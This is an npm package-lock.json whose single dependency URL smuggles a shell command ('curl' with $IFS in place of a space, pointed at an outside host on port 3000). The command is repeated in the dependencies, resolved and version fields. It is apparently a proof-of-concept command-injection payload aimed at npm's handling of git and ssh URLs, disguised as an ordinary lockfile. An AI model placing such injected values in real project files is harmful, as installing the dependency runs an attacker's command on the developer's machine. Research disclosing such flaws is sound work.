{
  "name": "javascript",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "version": "1.0.0",
      "license": "MIT",
      "dependencies": {
        "tyage-sample-package": "ssh+https://;curl$IFS.mocos.kitchen:3000;github.com/tyage/sample-package#semver:5.0.3"
      }
    },
    "node_modules/tyage-sample-package": {
      "resolved": "ssh+https:/;curl$IFS.mocos.kitchen:3000;github.com/tyage/sample-package#81371a81c3a00db92b4f053994343e75fa613281",
      "link": true
    },
    "ssh+https:/;curl$IFS.mocos.kitchen:3000;github.com/tyage/sample-package#81371a81c3a00db92b4f053994343e75fa613281": {}
  },
  "dependencies": {
    "tyage-sample-package": {
      "version": "file:ssh+https:/;curl$IFS.mocos.kitchen:3000;github.com/tyage/sample-package#81371a81c3a00db92b4f053994343e75fa613281"
    }
  }
}
